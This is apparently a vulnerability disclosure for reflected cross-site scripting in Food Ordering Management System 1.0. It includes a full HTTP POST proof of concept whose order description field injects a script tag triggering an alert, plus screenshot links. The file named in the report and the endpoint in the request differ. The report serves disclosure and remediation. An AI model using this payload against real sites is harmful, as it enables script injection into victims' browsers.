##The Food order management system has a reflective XSS vulnerability

## Affected version: 
Food Ordering Management System - 1.0

## Software:
https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html

## Vulnerability File:
/foms/index.php

## Description:
Food Ordering Management 1.0 is vulnerable to a reflected XSS vulnerability caused by the lack of filtering of input content in the textarea tab in /foms/index.php. A malicious attacker can exploit this vulnerability to generate a link containing malicious code to lure the victim into clicking on it.

Status: Low risk

POC
```
POST /foms/place-order.php HTTP/1.1
Host: localhost:8088
Content-Length: 117
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8088/foms/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=hlodrr0cq84ndg4raumb7hpcla
Connection: close

1=0&2=0&3=1&description=%22%3E+%3Cscript%3Ealert%28%2FThis+page+has+an+XSS+vulnerability%2F%29%3C%2Fscript%3E&action=
```


1、When an ordinary user generates an order, there is a message function
![efcc489b53a233bf1ee960ef1cb34eb](https://github.com/user-attachments/assets/30c3b4ac-ad04-4743-befb-a6231cb8e727)

![faf316603c599ac61addc544e489ff2](https://github.com/user-attachments/assets/2682e3ad-ad06-4248-8c32-818d9b04be08)


2、The input is not filtered in the "textarea" tab
![53ee009d56d7dfec4331519f305a858](https://github.com/user-attachments/assets/ddaed49f-e10d-41dd-8127-03e434a2812f)






